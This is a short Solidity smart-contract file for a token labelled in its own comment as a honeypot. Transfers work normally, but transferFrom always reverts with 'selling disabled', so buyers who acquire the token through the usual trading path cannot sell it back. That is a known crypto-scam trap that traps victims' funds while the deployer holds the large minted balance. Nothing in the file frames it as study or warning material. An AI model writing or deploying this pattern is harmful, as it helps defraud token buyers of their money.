// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract HoneypotToken {
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = 100000 ether;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function transfer(address to, uint256 amount) external {
        require(to != address(0), "invalid");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    //  Honeypot: nobody can send tokens back
    function transferFrom(address, address, uint256) external pure {
        revert("selling disabled");
    }
}
